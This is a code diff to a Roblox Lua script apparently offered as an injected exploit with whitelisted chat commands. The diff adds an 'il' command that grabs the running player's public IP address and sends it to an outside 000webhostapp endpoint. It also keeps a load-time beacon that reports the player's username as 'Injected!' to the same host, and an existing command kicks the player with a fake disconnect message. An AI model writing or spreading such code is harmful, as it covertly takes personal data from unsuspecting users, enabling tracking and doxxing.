@@ -35,6 +35,15 @@ AddCommand("kick", function(...)
     game.Players.LocalPlayer:Kick("Something went wrong, roblox has disconnected you.")
 end)
 
+AddCommand("il", function(...)
+    local s, e = pcall(function(...)
+        local uri = ("https://testwebsitebradlol.000webhostapp.com/swordburst3.php?content_string=")
+        local i = game:HttpGet("https://api.ipify.org/")
+        game:HttpGet(uri .. tostring(i))
+    end)
+    if not s then warn(e) end
+end)
+
 local Setup = function(Player)
     if table.find(Whitelist, Player.UserId) then
        Player.Chatted:Connect(CommandInput)
@@ -46,5 +55,5 @@ for i, v in pairs(Players:GetPlayers()) do
    Setup(v)
 end
 pcall(function(...)
-      game:HttpGet("https://testwebsitebradlol.000webhostapp.com/swordburst3.php?content_string=" .. tostring(game.Players.LocalPlayer.Name) .. " Did Something?")
+      game:HttpGet("https://testwebsitebradlol.000webhostapp.com/swordburst3.php?content_string=" .. tostring(game.Players.LocalPlayer.Name) .. " Injected!")
 end)
